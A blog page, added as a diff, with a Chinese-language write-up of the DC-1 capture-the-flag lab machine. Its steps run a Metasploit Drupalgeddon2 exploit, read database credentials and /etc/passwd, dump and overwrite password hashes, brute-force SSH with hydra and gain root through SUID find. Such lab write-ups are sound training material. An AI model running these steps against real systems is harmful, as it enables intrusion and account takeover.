@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="17year" />
+  <meta name="author" content="17year" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      DC1靶机记录 
+      
+      
+      |
+    
+     17year&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">17year</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">AboutMe</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DC1靶机记录</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-02-11 11:11:11
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/" title="靶机记录">
+                    <b>#</b> 靶机记录
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DC1-靶机记录"><a href="#DC1-靶机记录" class="headerlink" title="DC1 靶机记录"></a>DC1 靶机记录</h1><h3 id="nmap查看信息"><a href="#nmap查看信息" class="headerlink" title="nmap查看信息"></a>nmap查看信息</h3><p><code>nmap -A ip -sV -vv</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">80 http Apache/2.2.22</span><br><span class="line"></span><br><span class="line">22 ssh OpenSSH 6.0p1 Debian 4+deb7u7</span><br><span class="line"></span><br><span class="line">CMS Drupal 7</span><br></pre></td></tr></table></figure>
+<hr>
+
+<h3 id="使用MSF-搜索"><a href="#使用MSF-搜索" class="headerlink" title="使用MSF 搜索"></a>使用MSF 搜索</h3><p><code>search Drupal 7.x</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用payload-0-并且设置目标参数ip"><a href="#使用payload-0-并且设置目标参数ip" class="headerlink" title="使用payload 0 并且设置目标参数ip"></a>使用payload 0 并且设置目标参数ip</h3><p><code>use 0</code></p>
+<p><code>set rhost ip</code></p>
+<h3 id="成功执行payload并且尝试获取shell"><a href="#成功执行payload并且尝试获取shell" class="headerlink" title="成功执行payload并且尝试获取shell"></a>成功执行payload并且尝试获取shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3333 created.</span><br></pre></td></tr></table></figure>
+<h3 id="为了方便使用python交互shell"><a href="#为了方便使用python交互shell" class="headerlink" title="为了方便使用python交互shell"></a>为了方便使用python交互shell</h3><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<h3 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<h3 id="使用ls查看当前目录信息"><a href="#使用ls查看当前目录信息" class="headerlink" title="使用ls查看当前目录信息"></a>使用ls查看当前目录信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">COPYRIGHT.txt	    LICENSE.txt      cron.php	  misc	      sites</span><br><span class="line">INSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt	  modules     themes</span><br><span class="line">INSTALL.pgsql.txt   README.txt	     includes	  profiles    update.php</span><br><span class="line">INSTALL.sqlite.txt  UPGRADE.txt      index.php	  robots.txt  web.config</span><br><span class="line">INSTALL.txt	    authorize.php    install.php  scripts     xmlrpc.php</span><br></pre></td></tr></table></figure>
+<h3 id="找到flag1并查看"><a href="#找到flag1并查看" class="headerlink" title="找到flag1并查看"></a>找到flag1并查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat flag1.txt   </span><br><span class="line">Every good CMS needs a config file - and so do you</span><br><span class="line">//每个好的CMS都需要一个配置文件——你也是。</span><br></pre></td></tr></table></figure>
+<h3 id="根据flag1猜测flag2可能与cms配置文件有关"><a href="#根据flag1猜测flag2可能与cms配置文件有关" class="headerlink" title="根据flag1猜测flag2可能与cms配置文件有关"></a>根据flag1猜测flag2可能与cms配置文件有关</h3><h3 id="查找目录发现drupal配置文件发现flag2以及数据库信息"><a href="#查找目录发现drupal配置文件发现flag2以及数据库信息" class="headerlink" title="查找目录发现drupal配置文件发现flag2以及数据库信息"></a>查找目录发现drupal配置文件发现flag2以及数据库信息</h3><p><code>www-data@DC-1:/var/www/sites/default$ cat settings.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一部分内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren&#x27;t the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *暴力和字典攻击不是最常见的</span></span><br><span class="line"><span class="comment"> *只有获得访问权限的方法（你需要访问权限）。</span></span><br><span class="line"><span class="comment"> *你能用这些证书做什么？</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$databases</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="根据flag2提示尝试登录数据库"><a href="#根据flag2提示尝试登录数据库" class="headerlink" title="根据flag2提示尝试登录数据库"></a>根据flag2提示尝试登录数据库</h3><p><code>www-data@DC-1:/var/www$ mysql -u dbuser -pR0ck3t</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 49</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; usr drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| history                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="发现users表查看"><a href="#发现users表查看" class="headerlink" title="发现users表查看"></a>发现users表查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">select * from users;</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="发现密码加盐解不开"><a href="#发现密码加盐解不开" class="headerlink" title="发现密码加盐解不开"></a>发现密码加盐解不开</h3><h3 id="经过查看发现可以使用cms自带脚本生成加盐密码"><a href="#经过查看发现可以使用cms自带脚本生成加盐密码" class="headerlink" title="经过查看发现可以使用cms自带脚本生成加盐密码"></a>经过查看发现可以使用cms自带脚本生成加盐密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin 		hash: $S$DeMqLQwGP7RNQNFSEqHSTU82D/3fanHo3g.MK1a6JMBXjqU.7lyt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="将生成加盐密码重新替换为admin"><a href="#将生成加盐密码重新替换为admin" class="headerlink" title="将生成加盐密码重新替换为admin"></a>将生成加盐密码重新替换为admin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users set pass=&quot;$S$DeMqLQwGP7RNQNFSEqHSTU82D/3fanHo3g.MK1a6JMBXjqU.7lyt&quot; where uid=1; </span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>
+<h3 id="使用admin-admin-登录网站发现flag3"><a href="#使用admin-admin-登录网站发现flag3" class="headerlink" title="使用admin admin 登录网站发现flag3"></a>使用admin admin 登录网站发现flag3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line">//特殊的烫发将有助于找到passwd，但您需要执行该命令，以确定如何获取阴影中的内容。</span><br></pre></td></tr></table></figure>
+<h3 id="粗略翻译一下下一个flag可能与passwd有关"><a href="#粗略翻译一下下一个flag可能与passwd有关" class="headerlink" title="粗略翻译一下下一个flag可能与passwd有关"></a>粗略翻译一下下一个flag可能与passwd有关</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br></pre></td></tr></table></figure>
+<h3 id="发现flag4用户-尝试爆破"><a href="#发现flag4用户-尝试爆破" class="headerlink" title="发现flag4用户,尝试爆破"></a>发现flag4用户,尝试爆破</h3><p><code>hydra -l flag4 -P /usr/share/john/password.lst ssh://ip</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 172.16.27.58   login: flag4   password: orange</span><br></pre></td></tr></table></figure>
+<h3 id="使用flag4-orange登录"><a href="#使用flag4-orange登录" class="headerlink" title="使用flag4 orange登录"></a>使用flag4 orange登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> $ ssh flag4@172.16.27.58      </span><br><span class="line">flag4@172.16.27.58&#x27;s password: </span><br><span class="line">Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">flag4@DC-1:~$ cat flag4.txt </span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line">//您可以使用同样的方法在根目录中查找flag吗？</span><br><span class="line">//可能但也许没那么容易。也许是吧？</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="根据提示尝试提权"><a href="#根据提示尝试提权" class="headerlink" title="根据提示尝试提权"></a>根据提示尝试提权</h3><h3 id="查看root用户拥有的suid文件"><a href="#查看root用户拥有的suid文件" class="headerlink" title="查看root用户拥有的suid文件"></a>查看root用户拥有的suid文件</h3><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+<h3 id="发现find命令有提权方式"><a href="#发现find命令有提权方式" class="headerlink" title="发现find命令有提权方式"></a>发现find命令有提权方式</h3><p><code>www-data@DC-1:/tmp$ find -exec /bin/sh \;</code></p>
